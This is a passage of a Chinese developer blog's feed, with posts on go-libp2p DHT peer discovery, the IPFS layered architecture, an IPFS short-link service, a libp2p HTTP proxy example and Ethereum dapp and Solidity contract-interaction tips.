class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// 加入 dht 网络</span><br><span class="line">kademliaDHT, err := dht.New(ctx, host)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">panic(err)</span><br><span class="line">&#125;</span><br><span class="line">// 设置状态为 bootstrap 模式</span><br><span class="line">if err = kademliaDHT.Bootstrap(ctx); err != nil &#123;</span><br><span class="line">panic(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var wg sync.WaitGroup</span><br><span class="line">// connect 到 bootstrap 节点</span><br><span class="line">for _, peerAddr := range dht.DefaultBootstrapPeers &#123;</span><br><span class="line">peerinfo, _ := peer.AddrInfoFromP2pAddr(peerAddr)</span><br><span class="line">wg.Add(1)</span><br><span class="line">go func() &#123;</span><br><span class="line">defer wg.Done()</span><br><span class="line">if err := host.Connect(ctx, *peerinfo); err !=nil &#123;</span><br><span class="line">log.Println(err)</span><br><span class="line">&#125; else &#123;</span><br><span class="line">log.Println(&quot;Connection established with bootstrap node:&quot;, *peerinfo)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br></pre></td></tr></table></figure><p>不管是比特币，以太坊，还是早前的 BT 网络，任何新节点加入网络都需要种子 (bootstrap) 节点作为起点，然后扩展自己的路由表，完成初始化动作。</p><p>#####（三）广而告之</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 广而告之</span><br><span class="line">nodeName := &quot;mars&quot;</span><br><span class="line">log.Println(&quot;Announcing ourselves...&quot;)</span><br><span class="line">routingDiscovery := discovery.NewRoutingDiscovery(kademliaDHT)</span><br><span class="line">discovery.Advertise(ctx, routingDiscovery, nodeName)</span><br><span class="line">log.Println(&quot;Successfully announced!&quot;)</span><br></pre></td></tr></table></figure><p>回到我们开头的场景，假设我们初始化一个节点名叫 <code>mars</code>，我们加入 DHT 网络后，需要让所有节点都知道我是 mars 节点 。</p><p>这里先简单介绍下，原理下篇文章再分析。nodeName 其实最后被转换为一个内容的 hash，节点通过 Advertise 这个方法告诉其他节点，它拥有这个 hash，然后其他节点就会记住，更新自己的路由表。等到有请求去做这个内容的寻址时，就会告诉对方谁有这个内容，或者谁和这个内容更接近。</p><h5 id="（四）寻找节点"><a href="#（四）寻找节点" class="headerlink" title="（四）寻找节点"></a>（四）寻找节点</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">findName := &quot;earth&quot;</span><br><span class="line">log.Println(&quot;Searching for other peers...&quot;)</span><br><span class="line">peerChan, err := routingDiscovery.FindPeers(ctx, findName)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">panic(err)</span><br><span class="line">&#125;</span><br><span class="line">for peer := range peerChan &#123;</span><br><span class="line">fmt.Println(&quot;found peer&quot;, peer.ID)</span><br><span class="line">if peer.ID == host.ID() &#123;</span><br><span class="line">continue</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stream, _ := host.NewStream(ctx, peer.ID, protocol.ID(&quot;/chat/1.0.0&quot;))</span><br><span class="line">rw := bufio.NewReadWriter(bufio.NewReader(stream), bufio.NewWriter(stream))</span><br><span class="line">go readData(rw)</span><br><span class="line">go writeData(rw)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>FindPeers</code> 内在实现逻辑其实是找 <code>earth</code> 这个 hash 的地址，找到就和他建立一个双工的连接，正好和前面 handleStream 实现了服务端和客户端的通信。</p><p>#####（五）演示</p><p><img src="/media/15870291154380.jpg" alt=""></p><h5 id="六-完善"><a href="#六-完善" class="headerlink" title="(六) 完善"></a>(六) 完善</h5><p>上面的例子有个问题是，谁都可以宣称自己是 <code>mars</code> 节点，通信双方没法信任，所以这种模式适用聊天室的 channel 场景。通过将内容寻址改成节点寻址，就可找到可信通信方，当然前提是你知道你要通信的节点 ID。</p><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">findID, err := peer.Decode(&quot;QmcZf59bWwK5XFi76CZX8cbJ4BhTzzA3gU1ZjYZcYW3dw1&quot;)</span><br><span class="line">kademliaDHT.FindPeer(ctx, findID)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在前面的文章中，我们说过，DHT（分布式哈希表）是 IPFS 一个重要的组成部分，接下来我们会分别从应用，原理两个方面来分析 DHT。&lt;/p&gt;
&lt;p&gt;IPFS 的网络层源码在 &lt;a href=&quot;https://github.com/libp2p&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;libp2p&lt;/a&gt; 中，本文用 &lt;a href=&quot;https://github.com/libp2p/go-libp2p&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;go-libp2p&lt;/a&gt; 做分析。&lt;/p&gt;
&lt;p&gt;我们假设一个场景应用，有两个节点名字分别叫 earth 和 mars，然后他们分别加入了 DHT 网络，接下来他们需要找到对方，并能够互相发送消息。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ipfs" scheme="https://facert.github.io/tags/ipfs/"/>
    
  </entry>
  
  <entry>
    <title>深入理解 IPFS - 分层架构总览</title>
    <link href="https://facert.github.io/2020/04/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-IPFS-%E5%88%86%E5%B1%82%E6%9E%B6%E6%9E%84%E6%80%BB%E8%A7%88/"/>
    <id>https://facert.github.io/2020/04/25/深入理解-IPFS-分层架构总览/</id>
    <published>2020-04-25T08:21:18.000Z</published>
    <updated>2020-04-25T08:23:38.562Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/media/15861596465559.jpg" alt=""></p><p>我们首先从官方文档中一张比较经典的层级架构图开始，右边是 IPFS 的层级图，左边是对应现实网络中的一些实现形式。</p><h5 id="一-applications-应用层"><a href="#一-applications-应用层" class="headerlink" title="(一) applications 应用层"></a>(一) applications 应用层</h5><p>这个很好理解，就是基于 IPFS 网络开发的应用。我们可以在 <a href="https://github.com/ipfs/awesome-ipfs" target="_blank" rel="noopener">awesome</a> 看到一些应用。生态能不能繁荣，肯定是需要开发者参与。</p><a id="more"></a><h5 id="（二）-naming-命名"><a href="#（二）-naming-命名" class="headerlink" title="（二） naming 命名"></a>（二） naming 命名</h5><p>SFS 中文是自我认证文件系统，熟悉其他区块链项目的同学应该很好理解。比如比特币，我们采用非对称加密算法给节点生成了公钥和私钥。通过公钥生成的地址一旦参与转账行为，就会成为比特币网络中一份子，所有节点都知道这个地址。那么怎么证明这个地址是属于你，这就是一个自证明的过程，通过与公钥配对的私钥就可证明所有权。同样对于 IPFS 来说，也采用同样的方式，每个节点的 ID 都是全局唯一的存在，你可以通过 ID 对应的私钥来证明你是这个节点的主人。</p><p>举个应用的例子，你有个静态网站想要上传到 IPFS 上，但是网站是需要一直更新内容的，更新后 hash 值变了，在 IPFS 上访问的链接都会变。解决办法是将节点 ID 指向生成的 hash 上。用户访问节点 ID 即可 。</p><p>其实不仅仅是文件系统，身份认证（OpenID, OAuth2）可能也会由于区块链的发展出现新的契机。比如 ArcBlock 在推广的 DID。</p><p>#####（三）merkledag </p><p>merkledag 是 IPFS 的核心数据结构。比特币中用 merkle tree（默克尔树）快速校验区块数据完整性，使得轻节点钱包无需下载所有交易数据就能校验交易数据。而 merkledag 是一个有向无环图，对象模型和 Git 相似。这部分以后会详细说明。</p><h5 id="（四）exchange-块交换"><a href="#（四）exchange-块交换" class="headerlink" title="（四）exchange 块交换"></a>（四）exchange 块交换</h5><p>因为 IPFS 是一个全网文件系统，当你上传一个文件的时候，文件会被分割成 block，然后被传输到最近的节点上（XOR）。这样当你再去获取这个文件的时候，节点间就会相互沟通，每个节点都有一个 wantlist 和 havelist，最终找到所有的 block，重新获取到文件。</p><h5 id="（五）routing-路由"><a href="#（五）routing-路由" class="headerlink" title="（五）routing 路由"></a>（五）routing 路由</h5><p>其实在说到 exchange 的时候，有同学可能发现已经有点熟悉了，这不就是 BitTorrent 么。说的没错，不管是当年的电驴还是现在的迅雷，BT 网络一直很坚挺的存在着。IPFS 的很多设计都是借鉴于它 。说到 BT 的发展，最开始种子是存储到中央 Tracker 服务器上，这样一旦中央服务器挂了，这个种子也就废了，所以发展出了 DHT （分布式哈希表）。节点加入 DHT 网络，所有的资源都通过 hash 来寻址，无需中央节点介入，通过询问自己已知的节点，最终找到目标节点。</p><p>对于 IPFS 来说，内容和地址寻址都是同构hash，这样可以避免转换成本。虽然说 routing 的方式不止 DHT 一种，还有 mdns，DHCP。但是作为一个去中心化的项目来说，DHT 是 IPFS 路由必不可少的一项。</p><h5 id="（六）network-网络"><a href="#（六）network-网络" class="headerlink" title="（六）network 网络"></a>（六）network 网络</h5><p>IPFS 没有创造新的协议来做节点间通信，而是尽可能的兼容现存的所有协议，包括 tcp, http, quic 等等。兼容是通过一个 self-describing 的方式，如 <code>/ip4/7.7.7.7/tcp/6543</code>， 这种风格我们在 IPFS 其他 repos 中也都能看到身影，如 MultiHash, MultiAddress。不得不说，这种 self-describing 的形式在之后的协议升级上会有很大的好处。同样，面对各种网络环境，NAT 穿透也是必备的，IPFS 基于 ICE 框架，支持 TURN 和 STUN。</p><p>本文对 IPFS 各层做了简单的介绍，细节我们后续再聊。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/media/15861596465559.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们首先从官方文档中一张比较经典的层级架构图开始，右边是 IPFS 的层级图，左边是对应现实网络中的一些实现形式。&lt;/p&gt;
&lt;h5 id=&quot;一-applications-应用层&quot;&gt;&lt;a href=&quot;#一-applications-应用层&quot; class=&quot;headerlink&quot; title=&quot;(一) applications 应用层&quot;&gt;&lt;/a&gt;(一) applications 应用层&lt;/h5&gt;&lt;p&gt;这个很好理解，就是基于 IPFS 网络开发的应用。我们可以在 &lt;a href=&quot;https://github.com/ipfs/awesome-ipfs&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;awesome&lt;/a&gt; 看到一些应用。生态能不能繁荣，肯定是需要开发者参与。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ipfs" scheme="https://facert.github.io/tags/ipfs/"/>
    
  </entry>
  
  <entry>
    <title>基于 IPFS 的去中心化短链接服务</title>
    <link href="https://facert.github.io/2018/12/22/%E5%9F%BA%E4%BA%8E-IPFS-%E7%9A%84%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%E7%9F%AD%E9%93%BE%E6%8E%A5%E6%9C%8D%E5%8A%A1/"/>
    <id>https://facert.github.io/2018/12/22/基于-IPFS-的去中心化短链接服务/</id>
    <published>2018-12-22T10:15:30.000Z</published>
    <updated>2018-12-22T13:42:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>短链接服务国内外有很多，如免费的服务域名 t.cn，t.co, url.cn。但由于服务由公司提供，一旦公司关停服务，原来生成的短链接就面临没法访问的风险。如 google 就把之前的 goo.gl 域名停用了，当然之前生成的链接目前还提供服务。鉴于此，我们提供了一个基于 IPFS ，永久有效，不受任何中心化公司影响的短链接服务 <a href="http://t.bdaily.club/" target="_blank" rel="noopener">DtinyUrl</a>。</p><p><img src="/media/15454747683769.jpg" alt=""></p><p>你可以访问任意生成链接跳转到你的目标网址，当然如果你有自己的 IPFS 节点，也可以改成自己的节点地址。</p><p>我们提供了 <a href="https://gist.github.com/facert/fa39f0e094a2dd5c99f108cb975dde5b" target="_blank" rel="noopener">api</a> 接口供你使用，可以通过它开发一些插件来提高效率，如 Alfred workflow，捷径，浏览器插件。这里提供一个 <a href="https://github.com/facert/dtiny-plugins" target="_blank" rel="noopener">workflow</a> 版本。</p><p><img src="/media/15454750636254.jpg" alt=""></p><p>FAQ</p><ol><li>IPFS 的 gateway 地址也是基于域名的，如何保证自己生成的链接不因某些原因被屏蔽。</li></ol><pre><code>即使如 gateway.ipfs.io 之类的域名被屏蔽，你也可以使用其他 gateway 域名。或者自己运行一个节点，只要能连上其他节点，那么直接可以在本地访问到 IPFS 网络。</code></pre><ol><li><p>生成的短链接地址不够短</p><p> 这个问题确实存在，所以提供了两种类型的地址<br> (1) <a href="http://t.bdaily.club/ek5wz" target="_blank" rel="noopener">http://t.bdaily.club/ek5wz</a> 此类地址和其他短链接服务一样，中间会经过 Server 跳转一次到 IPFS。<br> (2) <a href="https://gateway.ipfs.io/ipfs/QmT2AKLygsgMa6r2AvxiJP31JTqSMMKCVK4FHKXiTCX3bR" target="_blank" rel="noopener">https://gateway.ipfs.io/ipfs/QmT2AKLygsgMa6r2AvxiJP31JTqSMMKCVK4FHKXiTCX3bR</a> 这类地址长度取决于 hash <code>QmT2AKLygsgMa6r2AvxiJP31JTqSMMKCVK4FHKXiTCX3bR</code> 的长度。</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;短链接服务国内外有很多，如免费的服务域名 t.cn，t.co, url.cn。但由于服务由公司提供，一旦公司关停服务，原来生成的短链接就面临没法访问的风险。如 google 就把之前的 goo.gl 域名停用了，当然之前生成的链接目前还提供服务。鉴于此，我们提供了一个基于 
      
    
    </summary>
    
    
      <category term="IPFS" scheme="https://facert.github.io/tags/IPFS/"/>
    
  </entry>
  
  <entry>
    <title>基于libp2p 的echo例子</title>
    <link href="https://facert.github.io/2018/09/26/%E5%9F%BA%E4%BA%8Elibp2p-%E7%9A%84echo%E4%BE%8B%E5%AD%90/"/>
    <id>https://facert.github.io/2018/09/26/基于libp2p-的echo例子/</id>
    <published>2018-09-26T10:18:15.000Z</published>
    <updated>2018-09-26T10:22:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>这个例子快速的展示如何使用 <code>go-libp2p</code>， 包括 <code>Host/Basichost, Network/Swarm, Streams, Peerstores and Multiaddresses</code>。</p><p>此例子能以 <code>listen</code> 或者 <code>dial</code> 模式启动。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个例子快速的展示如何使用 &lt;code&gt;go-libp2p&lt;/code&gt;， 包括 &lt;code&gt;Host/Basichost, Network/Swarm, Streams, Peerstores and Multiaddresses&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;此例子能以
      
    
    </summary>
    
    
      <category term="ipfs" scheme="https://facert.github.io/tags/ipfs/"/>
    
  </entry>
  
  <entry>
    <title>基于libp2p的http代理</title>
    <link href="https://facert.github.io/2018/09/26/%E5%9F%BA%E4%BA%8Elibp2p%E7%9A%84http%E4%BB%A3%E7%90%86/"/>
    <id>https://facert.github.io/2018/09/26/基于libp2p的http代理/</id>
    <published>2018-09-26T09:41:36.000Z</published>
    <updated>2018-09-26T10:09:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个 ipfs 官方的例子，基于 libp2p 模块构建一个 http 代理。<a href="https://github.com/libp2p/go-libp2p-examples/blob/master/http-proxy/proxy.go" target="_blank" rel="noopener">proxy.go</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                    XXX</span><br><span class="line">                                                                                                   XX  XXXXXX</span><br><span class="line">                                                                                                  X         XX</span><br><span class="line">                                                                                        XXXXXXX  XX          XX XXXXXXXXXX</span><br><span class="line">                  +----------------+                +-----------------+              XXX      XXX            XXX        XXX</span><br><span class="line"> HTTP Request     |                |                |                 |             XX                                    XX</span><br><span class="line">+-----------------&gt;                | libp2p stream  |                 |  HTTP       X                                      X</span><br><span class="line">                  |  Local peer    &lt;----------------&gt;  Remote peer    &lt;-------------&gt;     HTTP SERVER - THE INTERNET      XX</span><br><span class="line">&lt;-----------------+                |                |                 | Req &amp; Resp   XX                                   X</span><br><span class="line">  HTTP Response   |  libp2p host   |                |  libp2p host    |               XXXX XXXX XXXXXXXXXXXXXXXXXXXX   XXXX</span><br><span class="line">                  +----------------+                +-----------------+                                            XXXXX</span><br></pre></td></tr></table></figure><p>为了能够代理 HTTP 请求，我们首先创建一个本地节点监听 <code>localhost:9900</code>。 HTTP 请求通过 libp2p 流建立隧道到远程节点，然后执行 HTTP 请求，将请求结果返回给本地节点，最后发送给用户。</p><p>注意，这是一个很简单的代理，没有处理 header, 也不支持 HTTPS, <code>proxy.go</code> 代码都注释过了，每一步都有细节描述。</p><h4 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h4><p>在 <code>go-libp2p</code> 根目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; make deps</span><br><span class="line">&gt; go build ./examples/http-proxy</span><br></pre></td></tr></table></figure><h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><p>首先按如下方式执行 <code>remote</code>。它将打印一个本地节点的地址。如果你不在同一台机器上运行，需相应替换 IP。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; ./http-proxy</span><br><span class="line">Proxy server is ready</span><br><span class="line">libp2p-peer addresses:</span><br><span class="line">/ip4/127.0.0.1/tcp/12000/ipfs/QmddTrQXhA9AkCpXPTkcY7e22NK73TwkUms3a44DhTKJTD</span><br></pre></td></tr></table></figure><p>然后运行本地节点，指定请求需通过如下方式到远程节点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; ./http-proxy -d /ip4/127.0.0.1/tcp/12000/ipfs/QmddTrQXhA9AkCpXPTkcY7e22NK73TwkUms3a44DhTKJTD</span><br><span class="line">Proxy server is ready</span><br><span class="line">libp2p-peer addresses:</span><br><span class="line">/ip4/127.0.0.1/tcp/12001/ipfs/Qmaa2AYTha1UqcFVX97p9R1UP7vbzDLY7bqWsZw1135QvN</span><br><span class="line">proxy listening on  127.0.0.1:9900</span><br></pre></td></tr></table></figure><p>正如你所看到的，代理打印了监听的节点 <code>127.0.0.1:9900</code>。你现在可以用这个地址作为代理，以 <code>curl</code> 为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; curl -x &quot;127.0.0.1:9900&quot; &quot;http://ipfs.io/ipfs/QmfUX75pGRBRDnjeoMkQzuQczuCup2aYbeLxz5NzeSu9G6&quot;</span><br><span class="line">it works!</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这是一个 ipfs 官方的例子，基于 libp2p 模块构建一个 http 代理。&lt;a href=&quot;https://github.com/libp2p/go-libp2p-examples/blob/master/http-proxy/proxy.go&quot; target=&quot;_
      
    
    </summary>
    
    
      <category term="ipfs" scheme="https://facert.github.io/tags/ipfs/"/>
    
  </entry>
  
  <entry>
    <title>智能合约开发-基于以太坊的文章付费转载 demo</title>
    <link href="https://facert.github.io/2018/06/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91-%E5%9F%BA%E4%BA%8E%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%9A%84%E6%96%87%E7%AB%A0%E4%BB%98%E8%B4%B9%E8%BD%AC%E8%BD%BDdemo/"/>
    <id>https://facert.github.io/2018/06/30/智能合约开发-基于以太坊的文章付费转载demo/</id>
    <published>2018-06-30T07:50:47.000Z</published>
    <updated>2018-06-30T09:09:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间做了一个 Dapp demo，名字叫 <a href="http://ds.bdaily.club/" target="_blank" rel="noopener">钉书</a>。通过区块链技术，证明用户文章的所有权，以此为基础打造一个知识类商品平台，用户上传知识，文章，标价，买家选择有价值的知识和文章，付费转载。</p><p><img src="/media/15303460856374.jpg" alt=""></p><p>这个平台的愿景是为作者和内容使用方提供通畅的授权渠道，引导规范合理的转载行为，为原创者带来更多的尊重和收益。</p><p>下面具体说说 Dapp 开发过程中一些技术点和坑吧。</p><a id="more"></a><h5 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h5><p>目前 dapp 基本都是从零开始，帐户体系还未建立。而以太坊本身就有账户的概念，所以让 dapp 的帐户和以太坊账户打通也是必要的。目前有一些解决方案，比如基于 Metamask 的一键化登录，无需单独创建账号，用户通过 Metamask 插件签名后与后端交互校验后即可创建与 address 绑定的帐户。</p><p><img src="/media/15303468251209.jpg" alt=""></p><p><img src="/media/15303468301532.jpg" alt=""></p><p>具体交互流程可参考我的这篇文章：<a href="https://zhuanlan.zhihu.com/p/38213993" target="_blank" rel="noopener">智能合约开发 - 如何实现一键化登录 Dapp</a></p><h5 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h5><p>dapp 的交互目前有 truffle, web3.js ，都属于前端的 js 包。或许说明了一个问题，目前与智能合约的交互得依赖前端。但其实很多时候数据的处理和维护还得放在后端来做，所以让 dapp 的开发更加方便也变得很重要，这里有一个思路供参考： <a href="https://zhuanlan.zhihu.com/p/38244475" target="_blank" rel="noopener">智能合约开发 - 如何更好的与合约交互</a></p><h5 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h5><p>再说说智能合约的测试环境吧。</p><ol><li>如要在本地测试，可以用 ganache，他会启动一条私有的链，并且生成一些账户供测试用。</li><li>如要放到公网环境测试，可以用 Ropsten Test Net 环境部署合约。比如 <a href="http://ds.bdaily.club/" target="_blank" rel="noopener">钉书</a> 的合约就部署在以太坊的 Ropsten Test Net 环境。先安装 MetaMask 插件，切换到 Ropsten Test Net 环境，点击 BUY -&gt; ROPSTEN TEST FAUCET 即可获得免费以太币测试发布和购买文章。</li></ol><h5 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h5><p>截止目前，以太坊的一个全节点总数据快 600G 了，自己维护一个全节点成本也变的越来越高。有一个稳定和可信的全节点还是很重要的，比如 <a href="https://infura.io/，" target="_blank" rel="noopener">https://infura.io/，</a> 不过它不支持某些 json-rpc 接口，比如 event_filter。</p><h5 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h5><p>就这个 demo 来说，其实还有好多东西没做，比如</p><ol><li>作者的身份认证系统</li><li>文章通过数字签名来锚定唯一的链接</li><li>支持其他数字媒体类型的所有权确认</li></ol><h5 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h5><p>这里抱怨下，这个 demo 其实是迅雷区块链大赛的参赛作品。迅雷的评委只看了 ppt ，demo 一眼都没看就被淘汰了，还是有点失望评委的态度。</p><h5 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h5><p>最后推广下自己的 <a href="https://www.bdaily.club/about" target="_blank" rel="noopener">区块链日报</a>，目前更新到八十三期，在<a href="https://zhuanlan.zhihu.com/btchain" target="_blank" rel="noopener">知乎</a>和 <a href="https://twitter.com/bchain_daily" target="_blank" rel="noopener">twitter</a> 上都有了一定的关注量，希望能为真正学习区块链的人带来一点帮助。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前段时间做了一个 Dapp demo，名字叫 &lt;a href=&quot;http://ds.bdaily.club/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;钉书&lt;/a&gt;。通过区块链技术，证明用户文章的所有权，以此为基础打造一个知识类商品平台，用户上传知识，文章，标价，买家选择有价值的知识和文章，付费转载。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/15303460856374.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这个平台的愿景是为作者和内容使用方提供通畅的授权渠道，引导规范合理的转载行为，为原创者带来更多的尊重和收益。&lt;/p&gt;
&lt;p&gt;下面具体说说 Dapp 开发过程中一些技术点和坑吧。&lt;/p&gt;
    
    </summary>
    
    
      <category term="智能合约" scheme="https://facert.github.io/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>智能合约开发 - 如何更好的与合约交互</title>
    <link href="https://facert.github.io/2018/06/17/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91-%E5%A6%82%E4%BD%95%E6%9B%B4%E5%A5%BD%E7%9A%84%E4%B8%8E%E5%90%88%E7%BA%A6%E4%BA%A4%E4%BA%92/"/>
    <id>https://facert.github.io/2018/06/17/智能合约开发-如何更好的与合约交互/</id>
    <published>2018-06-17T13:24:30.000Z</published>
    <updated>2018-06-18T14:27:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>我们从一个简单的例子开始：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract Calc&#123;</span><br><span class="line">  uint count;</span><br><span class="line"></span><br><span class="line">  function add(uint a, uint b) returns(uint)&#123;</span><br><span class="line">    count++;</span><br><span class="line">    return a + b;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getCount() constant returns (uint)&#123;</span><br><span class="line">    return count;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是 Solidity 智能合约，我们将合约编译发布后，会通过 web3.js 调用，如调用 getCount()<br><a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myContract.getCount.call()</span><br></pre></td></tr></table></figure><p>web3.js 可以很方便的调用 json-rpc 接口来获得想要的数据，或者发起交易。</p><p>不过如果要进一步开发产品的话，会发现只依赖现存的一些调用函数会比较麻烦，举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract Item&#123;</span><br><span class="line">  mapping(address =&gt; uint256[]) public ownedItems;</span><br><span class="line">  </span><br><span class="line">  function ListItem() returns(mapping)&#123;</span><br><span class="line">    return ownedItems[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function addItem(_itemId) returns (uint256)&#123;</span><br><span class="line">    ownedItems[msg.sender].push(_itemId);</span><br><span class="line">    return _itemId</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们先获得某个地址的 item, 可以通过函数 <code>Item.ListItem.call()</code> 获得数据，前端获得数据后展示即可。但需求加上根据条件过滤出 item，根据个人喜好推荐 item，这些原本在传统开发中很容易实现的功能，在智能合约的交互中会变的相对麻烦。</p><p>这里面我提供一种思路供大家参考，利用智能合约的 event 事件来同步数据。</p><p>event 也可以称为日志，是交易收据（Transaction Receipts）的一部分，他可以用来异步通知客户端交易的执行结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract Item&#123;</span><br><span class="line">  mapping(address =&gt; uint256[]) public ownedItems;</span><br><span class="line">  </span><br><span class="line">  event AddItem(address, itemID);  // event</span><br><span class="line">  </span><br><span class="line">  function addItem(_itemId) returns (uint256)&#123;</span><br><span class="line">    ownedItems[msg.sender].push(_itemId);</span><br><span class="line">    AddItem(msg.sender, _itemId);</span><br><span class="line">    return _itemId;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如我们可以加个 AddItem 的事件，然后客户端监听事件结果，同步数据到 server 端，server 端保存到数据库后，可以根据需求开发 http 接口供前端调用，如过滤前三个月的，根据浏览量排行。</p><p><img src="/media/15293064015386.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 